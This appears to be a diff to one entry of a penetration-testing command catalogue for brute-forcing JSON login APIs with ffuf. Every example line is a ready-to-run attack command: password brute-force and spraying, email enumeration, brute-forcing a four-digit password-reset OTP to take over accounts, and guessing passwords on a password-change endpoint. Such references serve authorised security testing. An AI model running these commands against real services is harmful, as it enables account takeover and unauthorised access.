@@ -1,7 +1,7 @@
 {
   "id": "api-ffuf-json-bruteforce",
   "name": "API Credential Brute-Force with ffuf (JSON Body)",
-  "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w <emails.txt>:EMAIL -u http://<target>/api/v1/authentication/<role>/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 100",
+  "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w <userlist>:EMAIL -u http://<target>/api/v1/authentication/<role>/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 100",
   "platform": "linux",
   "category": "Password Attacks",
   "subcategory": "Credential Brute-Force",
@@ -12,7 +12,7 @@
     {
       "command": "ffuf -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<known_email>\", \"Password\": \"PASS\"}' -fr \"Invalid Credentials\" -t 50",
       "caption": "Password spray against single known email address",
-      "label": "ffuf brute"
+      "label": "Brute password (known email)"
     },
     {
       "command": "curl -X POST http://<target>/api/v1/authentication/customers/passwords/resets/email-otps -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\"}'\nffuf -u http://<target>/api/v1/authentication/customers/passwords/resets -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"<email>\", \"OTP\": \"FUZZ\", \"NewPassword\": \"NewP@ssw0rd1\"}' -w <(seq -w 0000 9999):FUZZ -t 50 -mr '\"SuccessStatus\":true'",
@@ -20,14 +20,14 @@
       "label": "POST request"
     },
     {
-      "command": "ffuf -w <emails.txt>:EMAIL -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"<common_pass>\"}' -fr \"Invalid Credentials\" -mc 200",
+      "command": "ffuf -w <userlist>:EMAIL -u http://<target>/api/v1/authentication/customers/sign-in -X POST -H \"Content-Type: application/json\" -d '{\"Email\": \"EMAIL\", \"Password\": \"<common_pass>\"}' -fr \"Invalid Credentials\" -mc 200",
       "caption": "Username/email enumeration with fixed password",
-      "label": "ffuf brute"
+      "label": "Brute email (known password)"
     },
     {
-      "command": "ffuf -w <wordlist.txt>:PASS -u http://<target>/api/v1/authentication/sign-in -X POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer <jwt>\" -d '{\"currentPassword\": \"PASS\", \"newPassword\": \"NewPass1!\"}' -fr \"incorrect\" -t 30",
+      "command": "ffuf -w <wordlist>:PASS -u http://<target>/api/v1/authentication/sign-in -X POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer <jwt>\" -d '{\"currentPassword\": \"PASS\", \"newPassword\": \"NewPass1!\"}' -fr \"incorrect\" -t 30",
       "caption": "Brute-force authenticated password-change endpoint",
-      "label": "ffuf brute"
+      "label": "Brute current-password (change-pw)"
     }
   ],
   "examples": [
